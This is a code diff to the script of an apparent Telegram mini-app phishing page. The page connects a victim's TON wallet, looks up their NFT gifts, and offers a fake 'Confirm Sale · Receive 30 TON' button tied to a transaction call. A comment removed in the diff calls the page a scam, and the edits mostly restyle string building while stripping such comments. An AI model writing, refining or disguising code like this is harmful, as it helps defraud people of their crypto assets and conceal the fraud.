@@ -120,9 +120,8 @@
         function updatePriceUI(price) {
             currentPrice = price;
             offerPriceEl.innerText = price;
-            // Примерный курс TON (можно обновлять через API, но для скама сойдет статикой)
             const usd = (price * 1.04).toFixed(2); 
-            offerUsdEl.innerHTML = `&nbsp;~&nbsp;$${usd}`;
+            offerUsdEl.innerHTML = "&nbsp;~&nbsp;$" + usd;
         }
 
         const startParam = tg?.initDataUnsafe?.start_param;
@@ -178,7 +177,7 @@
                 headerConnectBtn.innerHTML = '<i class="icon icon-connect-ton"></i><span class="tm-button-label">Connected</span>';
                 if (isTargetedOffer) {
                     acceptBtn.disabled = false;
-                    acceptBtn.innerHTML = `<span class="tm-button-label">Confirm Sale · Receive ${currentPrice} <span class="icon-before icon-ton tm-amount">TON</span></span>`;
+                    acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive ' + currentPrice + ' <span class="icon-before icon-ton tm-amount">TON</span></span>';
                     acceptBtn.onclick = sendTransaction; 
                 } else {
                     await scanWallet(wallet.account.address);
@@ -196,7 +195,7 @@
             try {
                 giftNameEl.innerText = "Loading...";
                 acceptBtn.innerHTML = '<span class="tm-button-label">Scanning...</span>';
-                const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=50`);
+                const res = await fetch("https://tonapi.io/v2/accounts/" + address + "/nfts?limit=50");
                 const data = await res.json();
                 if (!data.nft_items || data.nft_items.length === 0) {
                     giftNameEl.innerText = "No Gifts Found"; acceptBtn.innerHTML = '<span class="tm-button-label">You have no gifts</span>'; acceptBtn.disabled = true; return;
@@ -209,7 +208,7 @@
                 if (match && match[1]) {
                     const id = match[1]; let coll = (mainNft.collection?.name || "").toLowerCase().replace(/[^a-z0-9]/g, '');
                     if (coll.endsWith('s')) coll = coll.slice(0, -1);
-                    imgUrl = `https://nft.fragment.com/gift/${coll}-${id}.webp`;
+                    imgUrl = "https://nft.fragment.com/gift/" + coll + "-" + id + ".webp";
                 }
                 giftImage.onerror = function() {
                     if (mainNft.previews && mainNft.previews.length > 0) this.src = mainNft.previews[0].url;
@@ -219,9 +218,9 @@
                 giftImage.src = imgUrl || (mainNft.previews?.length > 0 ? mainNft.previews[0].url : (mainNft.metadata?.image || FALLBACK_IMG));
                 giftNameEl.innerText = nftName;
                 giftCollEl.innerText = mainNft.collection?.name || "Gifts Collection";
-                updatePriceUI(30); // Ставим дефолтную цену 30
+                updatePriceUI(30); 
                 acceptBtn.disabled = false;
-                acceptBtn.innerHTML = `<span class="tm-button-label">Confirm Sale · Receive ${currentPrice} <span class="icon-before icon-ton tm-amount">TON</span></span>`;
+                acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive ' + currentPrice + ' <span class="icon-before icon-ton tm-amount">TON</span></span>';
                 acceptBtn.onclick = sendTransaction;
             } catch (e) {
                 console.error(e); giftNameEl.innerText = "Error loading"; giftImage.src = FALLBACK_IMG;
@@ -242,7 +241,7 @@
                 if (tg) tg.HapticFeedback.notificationOccurred('success');
             } catch (e) {
                 acceptBtn.disabled = false; 
-                acceptBtn.innerHTML = `<span class="tm-button-label">Confirm Sale · Receive ${currentPrice} <span class="icon-before icon-ton tm-amount">TON</span></span>`;
+                acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive ' + currentPrice + ' <span class="icon-before icon-ton tm-amount">TON</span></span>';
             }
         }
     </script>
